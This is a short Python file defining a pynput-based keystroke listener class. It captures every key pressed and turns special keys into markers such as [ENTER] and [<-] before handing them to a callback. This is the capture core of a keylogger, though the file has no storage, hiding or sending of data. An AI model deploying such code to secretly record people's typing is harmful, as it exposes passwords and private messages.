from pynput import keyboard

class Keystrokelistener:
    def __init__(self, on_press_callback):
        self.on_press_callback = on_press_callback
        self.listener = keyboard.Listener(on_press=self._on_press)

    def _on_press(self, key):
        try:
            # These lines MUST be indented 8 spaces (or 2 tabs)
            k = key.char
        except AttributeError:
            special_keys = {
                "Key.space": " ",
                "Key.enter": "\n[ENTER]\n",
                "Key.backspace": "[<-]",
                "Key.tab": "\t",
                "Key.shift": "",
                "Key.shift_r": "",
                "Key.ctrl": "",
                "Key.alt": ""
            }
            k = special_keys.get(str(key), f"[{str(key).replace('Key.', '')}]")
        
        self.on_press_callback(k)

    def start(self):
        self.listener.start()

    def join(self):
        self.listener.join()

    def stop(self):
        self.listener.stop()
